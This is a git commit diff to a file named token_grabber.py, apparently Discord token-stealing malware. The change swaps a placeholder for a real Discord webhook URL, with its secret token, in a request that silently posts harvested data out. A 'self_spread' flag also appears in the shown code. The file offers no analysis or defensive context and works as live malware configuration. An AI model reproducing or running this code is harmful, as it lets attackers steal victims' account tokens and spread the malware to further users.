7e76ed243e3dac874e9cd09ac28187d3a0691724
snyc <86373610+ohsnyc@users.noreply.github.com>
2021-11-24 14:35:08 +0100

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -181,7 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/913059979123097631/X5oMuUDlxCsBzUvgNzi0ZjadLRXE91tcODyWRqAjOCM4wNPdyrqE0oNUq969lOd9nuXC", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
